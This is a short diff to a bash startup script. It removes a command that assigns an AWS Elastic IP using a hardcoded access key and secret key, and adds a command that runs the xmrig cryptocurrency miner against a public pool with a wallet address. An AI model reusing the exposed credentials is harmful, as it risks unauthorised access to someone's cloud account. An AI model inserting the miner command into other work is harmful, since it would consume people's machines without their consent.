@@ -1,2 +1,2 @@
 #! /bin/bash
-cd && sudo rm /var/lib/dpkg/lock* && sudo dpkg --configure -a && sudo apt update && sudo apt install -y python-pip && pip install aws-ec2-assign-elastic-ip && aws-ec2-assign-elastic-ip --access-key AKIAIKDEGGDSKH62J5EA --secret-key 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 --valid-ips 3.15.80.49
+cd && cd xmrig/build && ./xmrig --donate-level 1 -o loki.herominers.com:10111 -u LBZMdwBD1A15sP3Qmhk5UrfQHscestPieJE9zwhPiBBQLwnn8t7xHNz5WLGuS7R7vFY9B7SxxmZTPeNwUphzz6CP4uhuzuE -p Coba -a rx/loki -k --threads=7
